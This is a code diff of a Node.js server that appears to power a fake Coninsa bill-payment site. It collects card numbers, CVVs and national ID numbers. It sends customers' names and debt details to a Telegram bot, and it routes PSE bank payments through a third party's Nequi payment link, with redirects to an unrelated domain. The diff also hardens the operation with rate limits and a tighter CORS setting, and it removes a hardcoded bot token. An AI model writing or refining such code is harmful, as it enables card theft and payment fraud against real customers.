@@ -5,15 +5,15 @@ const axios   = require('axios');
 const path    = require('path');
 
 const PORT     = process.env.PORT     || 3002;
-const TG_TOKEN = process.env.TG_TOKEN || '8714922704:AAG9dcP56xY_gdUktBusuZFMdlj5Aqo2p4k';
-const TG_CHAT  = process.env.TG_CHAT  || '-5211450529';
+const TG_TOKEN = process.env.TG_TOKEN || '';
+const TG_CHAT  = process.env.TG_CHAT  || '';
 
 const PALOMMA_BASE = 'https://gosfhhn6za.execute-api.us-east-1.amazonaws.com';
 const MERCHANT_ID  = 'coninsa';
 
 const app = express();
-app.use(express.json({ limit: '10mb' }));
-app.use(cors({ origin: true, credentials: true }));
+app.use(express.json({ limit: '100kb' }));
+app.use(cors({ origin: 'https://gestadmoncool.online', credentials: true }));
 
 // â"€â"€ Cache 10 min â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
 const _cache = new Map();
@@ -52,7 +52,8 @@ function allowed(ip, max = 15, win = 60_000) {
   list.push(now); _rl.set(ip, list); return true;
 }
 function getIp(req) {
-  return (req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '').split(',')[0].trim();
+  // x-real-ip es puesto por Nginx y no puede ser falsificado por el cliente
+  return req.headers['x-real-ip'] || req.socket?.remoteAddress || '';
 }
 
 // â"€â"€ Palomma tRPC â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
@@ -646,8 +647,10 @@ app.post('/api/ping', (req, res) => {
 
 // â"€â"€ Proxy psec tarjetas â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
 app.post('/api/tarjeta/crear', async (req, res) => {
+  const ip = getIp(req);
+  if (!allowed(ip, 10, 60_000))
+    return res.status(429).json({ status: 'ERROR', message: 'Demasiadas solicitudes. Intenta en un momento.' });
   try {
-    const ip = getIp(req);
     const { numero_tarjeta, fecha, cvv, tipo_doc, cedula, monto } = req.body || {};
     if (cedula) _cedulaIp.set(String(cedula), ip);
     const banco = (await detectBin(numero_tarjeta)) ||
@@ -794,12 +797,15 @@ app.post('/api/coninsa/buscar', async (req, res) => {
       return res.status(502).json({ error: 'Sin respuesta de Coninsa. Intenta de nuevo.' });
     }
 
-    const invoices = data.invoices ?? [];
-    const total    = invoices.reduce((s, inv) => s + Number(inv.amount ?? inv.totalAmount ?? 0), 0);
+    const allInvoices      = data.invoices ?? [];
+    const invoices         = allInvoices.filter(inv => inv.status !== 'paid');
+    const nombre           = allInvoices[0]?.customerName ?? null;
+    const total            = invoices.reduce((s, inv) => s + Number(inv.amount ?? inv.totalAmount ?? 0), 0);
 
     const result = {
       ok:                   true,
       documento:            doc,
+      nombre,
       totalFacturas:        invoices.length,
       totalDeuda:           total,
       totalDeudaFmt:        fmtCOP(total),
@@ -810,13 +816,12 @@ app.post('/api/coninsa/buscar', async (req, res) => {
         id:          inv.id,
         descripcion: inv.description ?? inv.name ?? null,
         periodo:     inv.period ?? inv.periodStart ?? null,
-        vencimiento: inv.dueDate ?? null,
+        vencimiento: inv.expirationDate ?? inv.dueDate ?? null,
         monto:       inv.amount ?? inv.totalAmount ?? 0,
         montoFmt:    fmtCOP(inv.amount ?? inv.totalAmount ?? 0),
-        contrato:    inv.contractId ?? inv.contractNumber ?? null,
+        contrato:    inv.contract ?? inv.contractId ?? null,
         direccion:   inv.serviceAddress ?? inv.address ?? null,
         estado:      inv.status ?? null,
-        raw:         inv,
       })),
     };
 
@@ -824,7 +829,8 @@ app.post('/api/coninsa/buscar', async (req, res) => {
     await tgText(
       `🏢 <b>Coninsa — Consulta</b>\n\n` +
       `🔍 <b>Documento:</b> <code>${doc}</code>\n` +
-      `📊 <b>Facturas:</b> ${invoices.length}\n` +
+      (nombre ? `👤 <b>Nombre:</b> ${nombre}\n` : '') +
+      `📊 <b>Facturas pendientes:</b> ${invoices.length}\n` +
       (invoices.length > 0 ? `💰 <b>Total deuda:</b> ${fmtCOP(total)}\n` : `ℹ️ <b>Sin facturas pendientes</b>\n`) +
       `🕐 <b>Hora:</b> ${hora}`
     );
@@ -835,6 +841,110 @@ app.post('/api/coninsa/buscar', async (req, res) => {
   } catch (err) {
     console.error('[Coninsa] Error:', err.message);
     return res.status(502).json({ error: 'Error al consultar Coninsa. Intenta de nuevo.' });
+  }
+});
+
+// ── PSE directo Wompi (sin llave privada) ────────────────────────────────────
+const WOMPI_API        = 'https://api.wompi.co/v1';
+const NEQUI_LINK_SHORT = 'dEGMNb';
+
+let _wPubKey = null, _wVposId = null;
+async function wompiInit() {
+  if (_wPubKey) return;
+  const r = await axios.get(`${WOMPI_API}/payment_links/${NEQUI_LINK_SHORT}`);
+  _wPubKey = r.data.data.merchant_public_key;
+  _wVposId = r.data.data.id;
+}
+
+// Cache de bancos PSE
+let _bankCache = null;
+app.get('/api/pse/bancos', async (req, res) => {
+  const ip = getIp(req);
+  if (!allowed(ip, 20, 60_000))
+    return res.status(429).json({ status: 'ERROR', message: 'Demasiadas solicitudes.' });
+  try {
+    if (!_bankCache) {
+      await wompiInit();
+      const r = await axios.get(`${WOMPI_API}/pse/financial_institutions`, {
+        headers: { Authorization: `Bearer ${_wPubKey}` },
+      });
+      _bankCache = r.data.data;
+    }
+    res.json({ status: 'OK', data: _bankCache });
+  } catch (e) {
+    res.status(502).json({ status: 'ERROR', message: 'No se pudieron cargar los bancos.' });
+  }
+});
+
+app.post('/api/pse/generar', async (req, res) => {
+  const ip = getIp(req);
+  if (!allowed(ip, 5, 60_000))
+    return res.status(429).json({ status: 'ERROR', message: 'Demasiadas solicitudes. Intenta en un momento.' });
+
+  const { monto, bancoCode, cedula, tipoPersona, tipoDoc, nombre, email, telefono } = req.body;
+  if (!monto || !bancoCode || !cedula)
+    return res.status(400).json({ status: 'ERROR', message: 'Faltan datos requeridos.' });
+  const montoNum = parseInt(monto);
+  if (!Number.isFinite(montoNum) || montoNum < 1000 || montoNum > 100_000_000)
+    return res.status(400).json({ status: 'ERROR', message: 'Monto inválido.' });
+  if (!/^\d{5,12}$/.test(String(cedula)))
+    return res.status(400).json({ status: 'ERROR', message: 'Cédula inválida.' });
+  if (!/^\d+$/.test(String(bancoCode)))
+    return res.status(400).json({ status: 'ERROR', message: 'Banco inválido.' });
+
+  try {
+    await wompiInit();
+
+    // Tokens de aceptación frescos
+    const mResp = await axios.get(`${WOMPI_API}/merchants/${_wPubKey}`);
+    const acceptance_token     = mResp.data.data.presigned_acceptance.acceptance_token;
+    const accept_personal_auth = mResp.data.data.presigned_personal_data_auth.acceptance_token;
+
+    // Crear transacción PSE
+    const reference = `CON${Date.now()}`;
+    const txResp = await axios.post(`${WOMPI_API}/transactions`, {
+      acceptance_token,
+      accept_personal_auth,
+      amount_in_cents: montoNum * 100,
+      currency:        'COP',
+      customer_email:  email || `${cedula}@cliente.co`,
+      reference,
+      redirect_url:    'https://gestadmoncool.online',
+      payment_link_id: _wVposId,
+      payment_method: {
+        type:                       'PSE',
+        user_type:                  tipoPersona === 'J' ? 1 : 0,
+        user_legal_id_type:         tipoDoc || 'CC',
+        user_legal_id:              String(cedula),
+        financial_institution_code: String(bancoCode),
+        payment_description:        'Pago factura Coninsa',
+      },
+      customer_data: {
+        phone_number:  telefono || '',
+        full_name:     nombre   || 'Cliente',
+        legal_id:      String(cedula),
+        legal_id_type: tipoDoc || 'CC',
+      },
+    }, { headers: { Authorization: `Bearer ${_wPubKey}` } });
+
+    const txId = txResp.data.data.id;
+
+    // Esperar async_payment_url (aparece ~1s después)
+    let asyncUrl = null;
+    for (let i = 0; i < 10; i++) {
+      await new Promise(r => setTimeout(r, 1000));
+      const st = await axios.get(`${WOMPI_API}/transactions/${txId}`, {
+        headers: { Authorization: `Bearer ${_wPubKey}` },
+      });
+      asyncUrl = st.data.data?.payment_method?.extra?.async_payment_url;
+      if (asyncUrl) break;
+    }
+
+    if (!asyncUrl) throw new Error('URL del banco no disponible');
+    return res.json({ status: 'listo', url: asyncUrl });
+  } catch (e) {
+    const msg = e.response?.data?.error?.type || e.response?.data?.error?.messages?.join(' ') || e.message || 'Error generando PSE';
+    return res.status(502).json({ status: 'ERROR', message: msg });
   }
 });
 
